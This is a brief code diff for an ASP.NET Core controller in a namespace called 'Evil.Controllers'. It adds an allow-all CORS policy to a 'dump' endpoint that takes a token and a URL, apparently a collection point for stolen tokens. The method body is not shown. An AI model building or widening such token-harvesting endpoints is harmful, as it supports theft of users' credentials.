@@ -4,6 +4,7 @@ using System.Linq;
 using System.Threading.Tasks;
 using Microsoft.AspNetCore.Mvc;
 using Microsoft.Extensions.Caching.Memory;
+using Microsoft.AspNetCore.Cors;
 
 namespace Evil.Controllers
 {
@@ -22,6 +23,7 @@ namespace Evil.Controllers
         {
             this.cache = cache;
         }
+        [EnableCors("AllowAll")]
         [HttpGet("dump")]
         public async Task DumpToken(string token, string url)
         {
